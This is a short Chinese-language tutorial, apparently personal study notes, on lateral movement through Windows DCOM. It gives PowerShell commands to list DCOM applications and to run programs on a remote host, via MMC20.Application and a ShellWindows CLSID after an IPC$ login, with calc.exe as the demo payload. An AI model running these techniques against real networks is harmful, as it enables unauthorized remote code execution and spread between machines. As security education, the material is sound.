文章为之前学习记录，如有错误，请指正，谢谢。

Dcom是微软的一系列概念和程序接口，通过dcom，客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发起请求，今天讲讲如何通过dcom进行横向移动。

首先调用powershell

通过使用指令Get-CimInstance Win32_DCOMApplication来查看获取本地DCOM程序列表

![1615905214_6050c1bee9514402ea684.png!small](https://image.3001.net/images/20210316/1615905214_6050c1bee9514402ea684.png!small)

由于Get-CimInstance这个cmdlet只存在于powershell的3.0版本中，所以执行该指令需要2020以上版本的操作系统才可以执行，当然，如果没有3.0版本也可以通过执行Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication来获取，两者效果是相同的。

![1615905263_6050c1ef8329daef0ddec.png!small](https://image.3001.net/images/20210316/1615905263_6050c1ef8329daef0ddec.png!small)

1\. 使用DCOM执行任意命令，适用于本地

1>
$com=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.101.102"))

2> $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c
calc.exe","minimized")

通过执行以上命令，会以当前会话执行Administrator权限的calc.exe

2\. 在远程主机中执行命令

首先通过net use \\\IP "password" /user:域\dm 建立ipc$连接

然后执行以下命令:

$com=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","目标IP"))

$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","")

即可在远程计算机中执行calc.exe

3\. 第二种方法

在远程主机中调用powershell，输入命令:

$com=[Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.101.102")

$obj = [System.Activator]::CreateInstance($com)

$item = $obj.item()

$item.Document.Application.ShellExecute("cmd.exe","/c
calc.exe","c:\windows\system32",$null,0)

执行calc.exe程序  
![图片](https://image.3001.net/images/20200701/1593550745.png!small)

